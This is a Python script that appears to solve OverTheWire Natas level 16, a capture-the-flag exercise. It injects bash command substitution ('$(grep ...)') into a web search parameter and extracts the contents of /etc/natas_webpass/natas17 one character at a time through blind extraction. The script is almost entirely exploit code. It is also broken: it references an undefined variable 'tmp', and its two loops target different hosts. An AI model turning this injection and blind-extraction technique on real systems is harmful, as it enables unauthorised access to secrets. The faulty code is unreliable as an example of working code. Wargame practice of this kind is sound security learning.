import base64
import binascii
from tools import cryptotools
import requests
from requests.auth import HTTPBasicAuth
from secret.credentials import Credentials


def main():
    level = 16
    level_about = 'In this level you can see a sourcecode of vulnerable website, which is quite handy. The page \n' \
                  'code will execute a grep command on file dictionary.txt looking for phrase send in form. \n' \
                  'The input data will be validate for "illegal characters which are: [;|&`\'"] \n' \
                  'It looks like we can still use dollar sign and brackets $() to try to execute bash command \n' \
                  'substitution. So now we add our new grep for all letters in /etc/natas_webpass/natas17 file \n' \
                  'in we guess the letter tre grep result (which won\'t be empty) be appended to the search_string \n' \
                  'we provide in form - meaning we should get an empty result. If we did\'t guessed the letter in \n' \
                  'password we will append a empty our grep result which will just return to us a word we looked \n' \
                  'for in the form.'

    print("Hi there!\nyou've just run natas level " + str(level) +
          " (http://overthewire.org/wargames/natas/). Credentials are available in the secrets/credentials.py")

    print("\n" + level_about + "\n\n")

    # Real solution starts here :-)
    level_credentials = HTTPBasicAuth('natas' + str(level), Credentials.natas_credentials['natas' + str(level)])
    search_string = 'years'
    payload = {'needle': search_string}

    all_characters = "abcdefghijklmnoqprstuvwxyzABCDEFGHIJKLMNOQPRSTUVWXYZ0123456789"
    chars_in_pass = ''

    password = ''
    direction = 'backward'
    found = 0

    # we detect all characters in password so we can shorten our "brute force :-)"
    for char in all_characters:
        payload['needle'] = search_string + '$(grep ' + char + ' /etc/natas_webpass/natas17)'
        r = requests.get('http://natas17.natas.labs.overthewire.org/index.php?develop=1', params=payload,
                         auth=level_credentials)
        if not r.text.__contains__(search_string):
            chars_in_pass += char

    # The levels are build this way we know the password is going to be 32 chars length
    while len(password) < 32:
        for char in chars_in_pass:
            found = 0
            payload['needle'] = search_string + '$(grep ' + tmp + ' /etc/natas_webpass/natas17)'
            r = requests.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload,
                             auth=level_credentials)
            if not r.text.__contains__(search_string):
                found += 1
                if direction == 'backward':
                    password = char + password
                else:
                    password = password + char
                print("Direction: " + direction + "     , current pw: " + password)
                break
        # if we didn't find anything we change the direction of looking to forward. No we will append chars at the end.
        if found == 0:
                direction = 'forward'

    print("Found password: " + password)

    return True


if __name__ == '__main__':
    main()
